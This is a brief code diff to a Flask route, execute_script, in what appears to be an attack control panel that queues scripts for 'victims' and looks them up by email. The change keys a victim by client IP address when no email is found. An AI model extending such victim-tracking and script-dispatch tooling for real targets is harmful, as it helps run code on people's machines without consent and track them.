@@ -208,6 +208,8 @@ def execute_script(email):
         # oldList = executeQueue.get(str(email), [])
         # oldList.append(str(script))
         # executeQueue[str(email)] = oldList
+        if email=="no_email_found":
+            email = request.remote_addr
         victim_urls = list(victim.getFromVictim(email))
         return redirect(url_for('view_user', email=email))
         # return jsonify(url=victim_urls)
@@ -215,6 +217,8 @@ def execute_script(email):
         #print "EMAIL:", str(email)
         #print "EXECUTE:", executeQueue
         #print "SCRIPTS:", script
+        if email=="no_email_found":
+            email = request.remote_addr
         victim_urls = list(victim.getFromVictim(email))
         script = victim_urls
         if script:
